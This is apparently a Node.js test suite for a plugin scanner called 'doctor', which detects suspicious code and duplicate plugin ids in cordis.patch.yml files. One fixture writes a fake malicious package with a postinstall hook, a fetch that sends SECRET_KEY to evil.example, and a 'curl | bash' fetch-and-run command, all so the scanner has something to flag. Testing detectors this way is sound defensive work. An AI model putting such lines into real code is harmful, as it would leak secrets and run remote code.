import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

const { apply, registerHttpRoutes, parsePatchInserts } = await import('../dist/index.js')

function makeCtx() {
  const tools = []
  tools.register = (t) => tools.push(t)
  return { tools }
}

function makeFixture() {
  const dir = mkdtempSync(join(tmpdir(), 'doctor-test-'))
  writeFileSync(join(dir, 'package.json'), JSON.stringify({
    name: 'fixture', version: '1.0.0',
    scripts: { postinstall: 'node setup.js' },
  }))
  writeFileSync(join(dir, 'index.js'), [
    "const key = process.env.SECRET_KEY",
    "fetch('https://evil.example/collect?k=' + key)",
    "child_process.exec('curl -s http://x.y/z | bash')",
  ].join('\n'))
  writeFileSync(join(dir, 'clean.js'), 'export const x = 1\n')
  return dir
}

test('registers three tools', () => {
  const ctx = makeCtx()
  apply(ctx)
  assert.deepEqual(ctx.tools.map((t) => t.name).sort(), ['doctor_patch', 'doctor_scan', 'doctor_scan_path'])
})

test('flags exfil, credentials, and lifecycle in fixture', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const dir = makeFixture()
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  const r = await tool.execute({ path: dir })
  assert.equal(r.ok, true)
  assert.ok(r.hits >= 2, 'expected at least exfil + credential hits')
  assert.ok(r.lifecycle.length === 1 && r.lifecycle[0].script === 'postinstall')
  assert.notEqual(r.verdict, 'SAFE')
  const rules = new Set(r.results.flatMap((x) => x.hits.map((h) => h.rule)))
  assert.ok(rules.has('exfil-http') || rules.has('exfil-shell-net'))
  assert.ok(rules.has('cred-secrets'))
  rmSync(dir, { recursive: true, force: true })
})

test('clean dir is SAFE', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const dir = mkdtempSync(join(tmpdir(), 'doctor-clean-'))
  writeFileSync(join(dir, 'ok.js'), 'export const y = 2\n')
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  const r = await tool.execute({ path: dir })
  assert.equal(r.ok, true)
  assert.equal(r.verdict, 'SAFE')
  assert.equal(r.hits, 0)
  rmSync(dir, { recursive: true, force: true })
})

test('rejects relative paths', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  await assert.rejects(() => tool.execute({ path: '../x' }), /absolute/)
})

// 捕获 registerHttpRoutes 注册的路由, 并用假 res 调用它 —— 直接测我们自己的 handler
// (原生 node:http req/res), 而不是 Hono 的 Request/Response 适配层。
function captureRoutes(ctx) {
  // The fence asks the composition's `connection` service for a rejection before serving. These
  // helpers are handed a bare object ({} or a deps bag), so that read returned undefined, the fence
  // failed CLOSED with 503 -- correctly -- and the health tests asserted 503 instead of 200. The
  // stub never modelled a host; this makes it model one. The caller's object is preserved, because
  // dsh-busyloop passes { llm } and its providers tests need it.
  const withAdmittingConnection = (base) => {
    const own = base ?? {};
    return {
      ...own,
      get: (name) => (name === 'connection' ? { requestRejection: () => undefined } : own.get?.(name)),
    };
  };
  
  const routes = new Map()
  registerHttpRoutes(withAdmittingConnection(ctx), (kind, path, handler) => { routes.set(path, { kind, handler }) })
  const call = async (path, method = 'GET') => {
    const route = routes.get(path)
    if (!route) throw new Error('no route registered at ' + path)
    const res = { statusCode: 0, headers: {}, body: undefined, setHeader(k, v) { this.headers[k] = v }, end(b) { this.body = b } }
    await route.handler({ method, url: path }, res)
    return res
  }
  return { routes, call }
}

test('health route is exact /api/doctor/health and answers 200', async () => {
  const { routes, call } = captureRoutes({})
  assert.equal(routes.get('/api/doctor/health').kind, 'exact')
  const res = await call('/api/doctor/health')
  assert.equal(res.statusCode, 200)
  assert.equal(res.headers['content-type'], 'application/json; charset=utf-8')
  const body = JSON.parse(String(res.body))
  assert.equal(body.ok, true)
  assert.equal(body.plugin, 'dsh-plugin-doctor')
  assert.ok(body.rules > 0)
  assert.equal(body.hono, undefined)
})

test('non-GET is rejected with 405 + allow: GET', async () => {
  const { call } = captureRoutes({})
  const res = await call('/api/doctor/health', 'POST')
  assert.equal(res.statusCode, 405)
  assert.equal(res.headers['allow'], 'GET')
})

test('apply registers on the official ctx.webServer, not the absent ctx.http', () => {
  const registered = []
  let effectLabel = null
  const ctx = cordisCtx({
    webServer: { register: (r) => { registered.push(r); return () => {} } },
    extra: { tools: makeCtx().tools, effect: (fn, label) => { effectLabel = label; fn() } },
  })
  apply(ctx)
  assert.deepEqual(registered.map((r) => r.path), ['/api/doctor/health'])
  assert.match(String(effectLabel), /doctor/)
})

// 复刻 cordis 的 ctx 代理: 读一个已注册但**未声明 inject** 的服务时, get 陷阱先抛
// "cannot get property X without inject" —— 可选链 `ctx.webServer?.x` 挡不住。
// 这正是本次迁移踩到的坑: 在 apply 里直接读 ctx.webServer 会让整个插件激活失败。
function cordisCtx({ webServer, extra = {} } = {}) {
  let inInject = false
  const target = {
    ...extra,
    inject: (deps, cb) => {
      if (!deps.includes('webServer') || !webServer) return undefined
      const prev = inInject
      inInject = true
      try { return cb({ webServer, effect: extra.effect }) } finally { inInject = prev }
    },
  }
  return new Proxy(target, {
    get(t, prop) {
      if (prop === 'webServer' && !inInject) throw new Error('cannot get property "webServer" without inject')
      return t[prop]
    },
  })
}

test('the cordis trap is real, and apply avoids it by using ctx.inject', () => {
  const ctx = cordisCtx({ webServer: { register: () => () => {} } })
  assert.throws(() => ctx.webServer, /without inject/)
  assert.doesNotThrow(() => apply(ctx))
})

test('apply tolerates a host without webServer (no throw)', () => {
  apply(makeCtx())
  assert.doesNotThrow(() => apply(cordisCtx({ extra: { tools: makeCtx().tools } })))
})

// --- cordis patch insert-id collision ---
//
// The defect these cover is silent by construction: cordis-plugin-loader/lib/index.js:82 builds a map
// with Object.fromEntries, which keeps the LAST value for a duplicate key, so an insert row whose id
// collides is dropped without a log line. Nothing else in the toolchain reports it.

test('parsePatchInserts reads the observed cordis.patch.yml schema', () => {
  const rows = parsePatchInserts([
    '# a bundle layer',
    '- insert:',
    "    - id: plugin-doctor",
    "      name: '@snow-the/dsh-plugin-doctor'",
    '',
  ].join('\n'))
  assert.equal(rows.length, 1)
  assert.equal(rows[0].id, 'plugin-doctor')
  assert.equal(rows[0].name, '@snow-the/dsh-plugin-doctor')
  assert.equal(rows[0].line, 3)
})

test('parsePatchInserts sees DIRECT rows too, not just `insert:` wrappers', () => {
  // This is the live shape of ~/.dsh/profiles/web/cordis.patch.yml: one flat list, where all but
  // one row are direct. Requiring deeper indentation than an `insert:` marker missed 58 of its 59
  // rows and hid a real cross-file duplicate.
  const rows = parsePatchInserts([
    '- id: web',
    '  config:',
    '    searchProvider: dsh-search',
    '',
    '- insert:',
    '    - id: authorization',
    "      name: '@deepseek-ai/dsh-authorization'",
    '',
    '- id: llm-commandcode',
    '  name: "@mars-sea/dsh-commandcode-provider"',
    '  config:',
    '    apiKeyEnv: COMMANDCODE_API_KEY',
  ].join('\n'))
  assert.deepEqual(rows.map((r) => [r.id, r.name, r.line]), [
    ['web', null, 1],
    ['authorization', '@deepseek-ai/dsh-authorization', 6],
    ['llm-commandcode', '@mars-sea/dsh-commandcode-provider', 9],
  ])
})

test('parsePatchInserts ignores id-like lines with no list marker', () => {
  const rows = parsePatchInserts(['id: not-a-row', 'name: nope'].join('\n'))
  assert.deepEqual(rows, [])
})

// Regression: this exact shape is live in @linxin666/dsh-web-all. Its opt-in rows sit at the SAME
// indent as the `- insert:` marker, so a block-end test that only looked for a non-`-` line kept the
// block open and read every `- id: … / disabled: true` directive as a nameless insert row — which
// then looked like a duplicate of the real declaration above it. Seven false positives.
test('a nameless config row is not a declaration', () => {
  const rows = parsePatchInserts([
    '  # from ../dsh-ssh',
    '  - insert:',
    "      - id: web-ui-ssh",
    "        name: '@linxin666/dsh-web-all/ssh'",
    '        config:',
    "          plugin: '@linxin666/dsh-ssh'",
    '',
    '  # inactive by default (opt-in rows)',
    '  - id: web-ui-ssh',
    '    disabled: true',
  ].join('\n'))
  assert.equal(rows.length, 2, 'both rows are parsed…')
  assert.equal(rows[0].name, '@linxin666/dsh-web-all/ssh')
  assert.equal(rows[1].name, null, '…but only the first one DECLARES the entry')
  assert.equal(rows[1].disabled, true)
})

function patchFixture(files) {
  const dir = mkdtempSync(join(tmpdir(), 'doctor-patch-'))
  for (const [name, body] of Object.entries(files)) {
    const full = join(dir, name)
    mkdirSync(join(full, '..'), { recursive: true })
    writeFileSync(full, body)
  }
  return dir
}

test('two declarations of one id in ONE file is reported as HIGH and names both lines', async () => {
  const ctx = makeCtx(); apply(ctx)
  const dir = patchFixture({
    'cordis.patch.yml': [
      '- insert:',
      "    - id: shared",
      "      name: '@x/one'",
      "    - id: shared",
      "      name: '@x/two'",
    ].join('\n'),
  })
  const r = await ctx.tools.find((t) => t.name === 'doctor_patch').execute({ path: dir })
  assert.equal(r.verdict, 'HIGH')
  assert.equal(r.declarationCount, 2)
  assert.equal(r.uniqueIds, 1)
  const dup = r.issues.find((i) => i.kind === 'duplicate-declaration-same-file')
  assert.ok(dup, 'expected a same-file duplicate issue')
  assert.equal(dup.where.length, 2)
  assert.match(dup.where[0], /:2/)
  assert.match(dup.where[1], /:4/)
  rmSync(dir, { recursive: true, force: true })
})

test('the same id across TWO patch files is reported as MEDIUM, not HIGH', async () => {
  const ctx = makeCtx(); apply(ctx)
  const dir = patchFixture({
    'a/cordis.patch.yml': ['- insert:', '    - id: shared', "      name: '@x/one'"].join('\n'),
    'b/cordis.patch.yml': ['- insert:', '    - id: shared', "      name: '@x/two'"].join('\n'),
  })
  const r = await ctx.tools.find((t) => t.name === 'doctor_patch').execute({ path: dir })
  assert.equal(r.verdict, 'MEDIUM')
  assert.equal(r.issues.length, 1)
  assert.equal(r.issues[0].kind, 'duplicate-declaration-cross-file')
  assert.equal(r.patchFiles, 2)
  rmSync(dir, { recursive: true, force: true })
})

test('unique ids are clean', async () => {
  const ctx = makeCtx(); apply(ctx)
  const dir = patchFixture({
    'cordis.patch.yml': ['- insert:', '    - id: one', "      name: '@x/one'", '    - id: two', "      name: '@x/two'"].join('\n'),
  })
  const r = await ctx.tools.find((t) => t.name === 'doctor_patch').execute({ path: dir })
  assert.equal(r.verdict, 'SAFE')
  assert.deepEqual(r.issues, [])
  assert.equal(r.uniqueIds, 2)
  rmSync(dir, { recursive: true, force: true })
})

test('a config row that near-misses a declared id is reported as a likely typo', async () => {
  const ctx = makeCtx(); apply(ctx)
  const dir = patchFixture({
    'cordis.patch.yml': [
      '- insert:',
      "    - id: tool-subagent",
      "      name: '@x/tool-subagent'",
      '- id: tool-subagnt',
      '  disabled: true',
    ].join('\n'),
  })
  const r = await ctx.tools.find((t) => t.name === 'doctor_patch').execute({ path: dir })
  const issue = r.issues.find((i) => i.kind === 'dangling-config-row')
  assert.ok(issue, 'a one-edit typo must be reported')
  assert.equal(issue.id, 'tool-subagnt')
  assert.equal(issue.severity, 2)
  assert.match(issue.detail, /tool-subagent/)
  rmSync(dir, { recursive: true, force: true })
})

test('a config row owned by a bundle outside the scan is informational, not an issue', async () => {
  const ctx = makeCtx(); apply(ctx)
  // This is the live shape of dsh-experimental-agent-team-profile/cordis.patch.yml: it toggles
  // ids that dsh-base declares, and dsh-base is not inside a profile's node_modules.
  const dir = patchFixture({
    'cordis.patch.yml': ['- id: tool-subagent-control', '  disabled: true'].join('\n'),
  })
  const r = await ctx.tools.find((t) => t.name === 'doctor_patch').execute({ path: dir })
  assert.deepEqual(r.issues, [], 'out-of-scope ownership must not be reported as a problem')
  assert.equal(r.verdict, 'SAFE')
  assert.deepEqual(r.unresolvedConfigIds, [{ id: 'tool-subagent-control', where: `${join(dir, 'cordis.patch.yml')}:1` }])
  rmSync(dir, { recursive: true, force: true })
})

test('a config row beside its own declaration is NOT dangling', async () => {
  const ctx = makeCtx(); apply(ctx)
  const dir = patchFixture({
    'cordis.patch.yml': ['- insert:', '    - id: a', "      name: '@x/a'", '', '- id: a', '  disabled: true'].join('\n'),
  })
  const r = await ctx.tools.find((t) => t.name === 'doctor_patch').execute({ path: dir })
  assert.equal(r.verdict, 'SAFE', 'declare-then-toggle is the documented opt-in pattern')
  assert.equal(r.declarationCount, 1)
  assert.equal(r.configRowCount, 1)
  rmSync(dir, { recursive: true, force: true })
})

test('doctor_patch rejects relative paths', async () => {
  const ctx = makeCtx(); apply(ctx)
  await assert.rejects(() => ctx.tools.find((t) => t.name === 'doctor_patch').execute({ path: 'x' }), /absolute/)
})